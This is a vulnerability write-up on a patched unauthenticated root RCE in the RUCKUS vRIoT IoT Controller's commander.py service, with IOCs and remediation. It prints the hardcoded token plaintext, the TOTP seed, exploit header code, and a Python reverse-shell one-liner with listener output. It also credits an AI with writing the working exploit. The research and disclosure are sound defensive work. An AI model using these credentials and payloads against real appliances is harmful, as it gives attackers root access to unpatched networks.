---
layout: post
title: "Commanding the riot: RUCKUS vRIoT CVE-2025-69425"
date: 2026-04-21 17:19 +0200
description: "Obtaining unauthenticated remote root access on RUCKUS IoT Controller via the commander.py network-exposed service"
categories: [Vulnerability Research]
tags: [Ruckus, CommScope, vulnerability-research, CVE-2025-69425]
---

# Intro

In my previous blog post I wrote about how I achieved remote root access to the Ruckus IoT Controller via hardcoded SSH credentials and Docker socket abuse. If you are following along, all the setup-related stuff and initial access can be found [here](/posts/ruckus-vriot-hardcoded-credentials/). That vulnerability chain involved a custom restricted shell, a MAC-based emergency authentication system, and ultimately leveraging Docker group membership for privilege escalation.

But I had a hunch that told me to look around the appliance a bit more, as with [Ruckus Network Director](/posts/ruckus-network-director-hardcoded-credentials/). With root access on the vRIoT appliance established, I decided to dig deeper into the filesystem and running processes.

# Command Execution as Root via Hardcoded Tokens for the Network-Exposed Service (CVE-2025-69425)

While analyzing the vRIoT filesystem after obtaining root access, one process caught my attention:

```shell
root@vriot:/riot/bin# ps -efw | grep commander.py
root         720       1  0 Nov12 ?        00:05:03 /usr/bin/python3 /riot/bin/commander.py

root@vriot:/riot/bin# netstat -antp | grep 2004
tcp        0      0 0.0.0.0:2004            0.0.0.0:*               LISTEN      720/python3
```

A Python script, network exposed, running as root? W00tw00t? So, how does it look like?

```python
# root@vriot:/riot/bin# cat /riot/bin/commander.py
import json
import socket
import hashlib
from _thread import start_new_thread
from subprocess import run, PIPE, Popen, call
from allowed_commands import LINUX_COMMANDS
class Commander:
    def __init__(self, command, thread_id):
        self.thread_id = thread_id
        self.command = self._get_command(command)
        self.token = "56e05416fc1cf6be2a3f3600e333d25f38a42a231041eaa2f886e33147107dcc"
        self.hash_object = hashlib.sha256()
    def _get_command(self, command):
        try:
            self.dynamic_command = False
            return LINUX_COMMANDS[command]
        except KeyError:
            self.dynamic_command = True
            dynamic_cmd = {"command_syntax":command + " "}
            return dynamic_cmd
    def hash_string(self, token):
        self.hash_object.update(token.encode('utf-8'))
        return self.hash_object.hexdigest()
    def execute(self, args_json):
        if 'totp' not in args_json:
            return {
                "is_error": True, "msg": "Auth Failed: Invalid token!"
            }
        command = ["docker", "exec", "riot-admin-api", "python3", "verify_totp.py"]
        command.extend(args_json.get("totp").values())
        authenticate = Popen(command)
        print(authenticate,args_json.get("totp"))
        if authenticate.wait() != 0 :
            return {
                "is_error": True, "msg": "Auth Failed: Invalid/Expired totp!"
            }
        if "token" not in args_json or self.hash_string(args_json.get("token")) != self.token:
            return {
                "is_error": True, "msg": "Auth Failed: Invalid token!"
            }
        args = [] if args_json.get("args") == "NO ARGS" else args_json.get("args").split(" ")
        if self.dynamic_command == False:
            command_syntax = self.command['command_syntax']
            required_args = self.command['required_args']
        else:
            command_syntax = self.command['command_syntax'] + " ".join(args)
            required_args = len(args)
        if len(args) == required_args:
            command = command_syntax.format(*args)
            print("Command Count : {} - COMMAND: {}".format(self.thread_id, command))
            try:
                result = run(command, shell=True, stdout=PIPE, stderr=PIPE, encoding='utf-8', check=True)
                return {
                    "is_error": False, "msg": result.stdout.strip()
                }
            except Exception as e:
                return {
                    "is_error": True, "msg": str(e)
                }
        else:
            return {
                    "is_error": True, "msg": "ARG LENGTH NOT MATCHED"
                }
class CommanderSocket:
    def __init__(self):
        self.server_socket = socket.socket()
        self.host = '0.0.0.0'
        self.port = 2004
        self.thread_count = 0
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
    def handle_client(self, client_socket):
        command = client_socket.recv(2048).decode('utf-8')
        if command:
            commander = Commander(command, self.thread_count)
            client_socket.sendall(command.encode('utf-8'))
            args_payload = client_socket.recv(2048).decode('utf-8')
            output = commander.execute(json.loads(args_payload))
            response = json.dumps(output)
            client_socket.sendall(response.encode('utf-8'))
        client_socket.close()
        self.thread_count += 1
    def start_server(self):
        print("COMMANDER SERVER STARTED")
        print("Waiting for commands...")
        while True:
            client_socket, address = self.server_socket.accept()
            start_new_thread(self.handle_client, (client_socket,))
if __name__ == "__main__":
    commander = CommanderSocket()
    commander.start_server()
```

Two things matter here.

First, the `KeyError` branch in `_get_command` starting at line 14. If the command you send isn't in the `LINUX_COMMANDS` allowlist, you would expect that it gets rejected. However, that is not the case. The code doesn't reject it at all. It flags the command as `dynamic_command` at line 19, wraps it in `{"command_syntax": command + " "}`, and still passes it down to `run(command, shell=True, ...)` at line 53. 

As for the allowlist, it contains legitimate system administration commands like: user management (`ADD_USER`, `DELETE_USER`), service control (`START_SYSTEMD_SERVICE`, `RESTART_SUPERVISOR`), file operations (`COPY`, `MOVE`, `REMOVE`), and system utilities (`REBOOT`, `CHANGE_PASSWORD`). But the allowlist is cosmetic. The service executes anything.

A sample of the allowed commands from `allowed_commands.py`:

```python
LINUX_COMMANDS = {
    "ADD_USER": {"required_args": 1, "command_syntax": "useradd {0}"},
    "DELETE_USER": {"required_args": 1, "command_syntax": "userdel -r {0}"},
    "REBOOT": {"required_args": 0, "command_syntax": "reboot"},
    "REMOVE": {"required_args": 1, "command_syntax": "rm -rf {0}"},
    "CHANGE_OWNER": {"required_args": 2, "command_syntax": "chown {0} {1}"},
    "START_SYSTEMD_SERVICE": {"required_args": 1, "command_syntax": "service {0} start"},
    "KILL": {"required_args": 2, "command_syntax": "kill {0} {1}"},
    "PS": {"required_args": 0, "command_syntax": "ps aux --cols=1024"},
    "LS": {"required_args": 1, "command_syntax": "ls -ltrh {0}"},
    "TAR": {"required_args": 2, "command_syntax": "tar zcf {0} {1}"},
    # ... 70+ more administrative commands
}
```

This isn't a basic read-only interface. It's a comprehensive remote administration tool, which makes the bypass more significant.

Second, the authentication. There are two gates before `run` at line 53 gets called:

1. A **static token check** — whatever the client puts in `args_json["token"]` is SHA256'd and compared to the hardcoded hash `56e05416fc1cf6be2a3f3600e333d25f38a42a231041eaa2f886e33147107dcc` at line 38.
2. A **TOTP check** — at lines 30-32, the service shells out to `verify_totp.py` inside the `riot-admin-api` container with three values supplied by the client.

Both have to pass. Let's break them in order.

## Gate 1 — The static SHA256 token

The target hash is in the source. The question is: what plaintext produces it? Brute-forcing an arbitrary-length SHA256 isn't a plan, so the first move I made was to grep the filesystem for the hash. The hash did not appear anywhere else. However, digging around a bit, I saw that the `verify_totp.py` also imports `opspack.sysinfo` package, which contains a module called `cmd.py` and inside of it I discovered a hardcoded token value:

```shell
root@vriot:/riot/bin# grep -r "self.token " /var/lib/docker/overlay2/27ba26297bc046b75ceda6459db9ce9cfa19dd307eca80c94b61bbcfb2d21e7c/diff/VRIOT/common/python/opspack/sysinfo/cmd.py
        self.token = "dpj$wX0NUzRt0t2OgwWfvgd"
```

If we hash this static token value with SHA256, we get the following:

```python
>>> import hashlib
>>> hashlib.sha256(b"dpj$wX0NUzRt0t2OgwWfvgd").hexdigest()
'56e05416fc1cf6be2a3f3600e333d25f38a42a231041eaa2f886e33147107dcc'
```

And that matches the static token at line 12 of the `commander.py`. Gate 1 down.

## Gate 2 — The TOTP

`commander.py` delegates TOTP validation to `verify_totp.py` inside the `riot-admin-api` container. It looks like this:

```python
import pyotp
import hmac, hashlib, base64
from collections import deque
from opspack.sysinfo import config as configfile

config = configfile.ConfigMongoDbConnector()

class Token:
    used_nonces  = deque(maxlen=50)
    static_token = config.get('prestart_token', eval(base64.b64decode(configfile.envkey())))
    secret       = base64.b32encode(static_token.encode()).decode()

    @staticmethod
    def verify_totp(headers):
        token     = headers.get("X-TOTP-Token")
        nonce     = headers.get("X-TOTP-Nonce")
        signature = headers.get("X-TOTP-Signature")
        message   = f"{token}:{nonce}"
        expected  = hmac.new(Token.secret.encode(), message.encode(), hashlib.sha256).hexdigest()
        if signature != expected:       return False
        if nonce in Token.used_nonces:  return False
        Token.used_nonces.append(nonce)
        if not pyotp.TOTP(Token.secret).verify(token, valid_window=10):
            return False
        return True
```

On paper, we have TOTP + nonce + HMAC signature, three headers, all verified server-side. In practice, the entire scheme rides on one value: `static_token`. So where does `static_token` come from?

```python
static_token = config.get('prestart_token', eval(base64.b64decode(configfile.envkey())))
```

`config.get(key, default)` basically means: try MongoDB first, fall back to the second argument. Both paths lead to the same outcome: a static secret that never rotates. Whether the runtime picks the MongoDB default or the envkey fallback, an attacker with filesystem access has the TOTP seed.

### The MongoDB path

Easiest to just ask the container for the value:

```shell
root@vriot:/riot/bin# docker exec riot-admin-api python3 -c "
from opspack.sysinfo import config as configfile
import base64
config = configfile.ConfigMongoDbConnector()
token = config.get('prestart_token', eval(base64.b64decode(configfile.envkey())))
print(f'TOTP: {base64.b32encode(token.encode()).decode()}')
"
TOTP: KRXWWZLOEBTTMN3GMQ2DI2DKHA3WQZ3UPE4DS5DUMZTHMZZVGRTGW4Y=
```

So, the `prestart_token` in MongoDB is a hardcoded default written at provisioning, never rotated, identical across every appliance of this version.

### The envkey fallback

Even if the `prestart_token` in MongoDB was empty, the fallback is just as exposed. The `configfile.envkey()` function returns what looks like random base64 data, but it's actually a base64-encoded Python expression that gets passed to `eval()`.

```python
def envkey():
    return b'JyQnLmpvaW4ocmV2ZXJzZWQoJ2R0cmNlY2xrbW9pb295dXJ2JykpWzotOF0rJyMnLmpvaW4ocmV2ZXJzZWQoJ2xreWdmdCcpKVs6N10='
```

Decoding:

```python
>>> import base64
>>> base64.b64decode(b'JyQnLmpvaW4ocmV2ZXJzZWQoJ2R0cmNlY2xrbW9pb295dXJ2JykpWzotOF0rJyMnLmpvaW4ocmV2ZXJzZWQoJ2xreWdmdCcpKVs6N10=').decode()
"'$'.join(reversed('dtrceclkmoiooyurv'))[:-8]+'#'.join(reversed('lkygft'))[:7]"
```

Walking it manually:

- `reversed('dtrceclkmoiooyurv')` produces `v, r, u, y, o, o, i, o, m, k, l, c, e, c, r, t, d`
- `'$'.join(...)` produces `v$r$u$y$o$o$i$o$m$k$l$c$e$c$r$t$d`
- `[:-8]` trims the last 8 chars, leaving `v$r$u$y$o$o$i$o$m$k$l$c$et`
- Same pattern on `'lkygft'` with `#` and `[:7]`, that produces `t#f#g#y`
- Concatenated: `v$r$u$y$o$o$i$o$m$k$l$c$et#f#g#y`

Both paths, the MongoDB default and envkey fallback, are hardcoded. Only question is which one the runtime picks.

## Putting it together

With the TOTP secret `KRXWWZLOEBTTMN3GMQ2DI2DKHA3WQZ3UPE4DS5DUMZTHMZZVGRTGW4Y=` and the static token `dpj$wX0NUzRt0t2OgwWfvgd`, we can build the three TOTP headers:

```python
import pyotp, hmac, hashlib, uuid

TOTP_SECRET  = "KRXWWZLOEBTTMN3GMQ2DI2DKHA3WQZ3UPE4DS5DUMZTHMZZVGRTGW4Y="
STATIC_TOKEN = "dpj$wX0NUzRt0t2OgwWfvgd"

def generate_totp_payload():
    token     = pyotp.TOTP(TOTP_SECRET).now()
    nonce     = str(uuid.uuid4())
    signature = hmac.new(TOTP_SECRET.encode(), f"{token}:{nonce}".encode(), hashlib.sha256).hexdigest()
    return {"X-TOTP-Token": token, "X-TOTP-Nonce": nonce, "X-TOTP-Signature": signature}
```

There's no rate limiting on authentication attempts, and the TOTP code isn't tied to a specific client. Anyone who knows the secret can generate valid codes at will. The `valid_window=10` parameter in `verify_totp.py` makes it even easier: the server accepts codes from 10 time steps in either direction, giving you roughly ±5 minutes of tolerance.

## Clock synchronization gotcha

During various testing, the exploit sometimes failed due to clock skew between the target and my system. TOTP is time-sensitive with the ±5 minute tolerance mentioned above, but the target's clock was 9 hours off. The solution I opted for to auto-detect the time difference is the HTTP `Date` header from the appliance's web service on port 443. The exploit now automatically compensates for clock drift, making it more reliable in real-world scenarios where appliances are in different time zones or manually set times.

**Final note:** prior to demonstrating RCE, I want to emphasize something. As I dug through the filesystem and kept finding pieces of TOTP logic scattered everywhere in cmd.py modules, MongoDB configs, verify_totp.py scripts - it became confusing to me. Claude helped me connect these fragments and write an exploit that actually works. This is where AI really shines, helping in creating a working PoC in a matter of minutes, while I would do the manual work of digging on the appliance.

RCE time.

## RCE

```shell
$ python3 CVE-2025-69425.py 10.0.13.139 'whoami;hostname'
[*] Target: 10.0.13.139
[*] Command: whoami;hostname NO ARGS
[*] Generating TOTP...
[*] Echo: whoami;hostname
[*] Sending payload...
[+] Success!

root
vriot
```

![Wireshark Capture](/assets/img/6/ruckus-vriot-rce-network-capture.png)

Exploitation video:
<video width="100%" controls>
  <source src="/assets/img/6/CVE-2025-69425.mp4" type="video/mp4">
</video>

The PoC can be found [here](/assets/pocs/CVE-2025-69425.py).

Any attacker who can reach port 2004 has the same "credentials" as every other attacker, because the credentials are baked into the firmware and identical across every deployment.

Reverse shell lands just as cleanly:

```shell
$ python3 CVE-2025-69425.py 10.0.13.139 "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.13.137\",3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
[*] Target: 10.0.13.139
[*] Generating TOTP...
[*] Echo: python3 -c 'import socket,subprocess,os;...'
[*] Sending payload...
```

On the listener:

```shell
$ nc -klvnp 3333
Listening on 0.0.0.0 3333
Connection received on 49798
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
vriot
```

# IOCs, Remediation and References

## Indicators of Compromise

- Inbound connections to `tcp/2004` on a vRIoT appliance from anything other than the management network.
- Unexpected `commander.py` child processes — the service spawns one `docker exec ... verify_totp.py` per request, so an unusual volume of those in process accounting is a signal.
- Reverse shell outbound connections from the vRIoT host, especially from `python3` children of `commander.py`.

## Remediation

- Upgrade to RUCKUS IoT 3.0.0.0 or later. All versions from 2.3.0.0 are vulnerable. The patched version removes the network exposure of `commander.py` entirely and the service no longer listens on 2004.
- Restrict network access to TCP port 2004 at the perimeter until patched.
- Isolate vRIoT appliances on a dedicated management VLAN.
- Reset credentials after upgrading, just on principle.

## References

- **Vendor Advisory** — [RUCKUS IoT Controller: Vulnerabilities in Management Interface Authentication and Access Control](https://support.ruckuswireless.com/security_bulletins/336)
- **CVE-2025-69425** - [https://www.vulncheck.com/advisories/ruckus-vriot-iot-controller-hardcoded-tokens-rce](https://www.vulncheck.com/advisories/ruckus-vriot-iot-controller-hardcoded-tokens-rce)

# Outro

The Ruckus team quickly acknowledged the report submitted via HackerOne and fixed the issues in a new release. 

For me, it was really fun. But at some point I asked myself: this is a billion dollar company. Maybe I could do some beg bounty? Unfortunately, the answer was no. They do not give any bounties. While I did not start to do this for the money, after you find 4 CVE's in their enterprise products, that have a great impact - it would be nice to get some money to spend on beers with friends. Also, it would encourage me and other researchers to dig up additional vulnerabilities, making their product more secure? Or is it not so important? If you read my vulnerability research blogs about Ruckus products, it boils down to hardcoded tokens / credentials and suspicious services running with root. Intentional? Probably just bad decisions. Anyways, time to wrap this one up.

Command the planet.

kr3bz
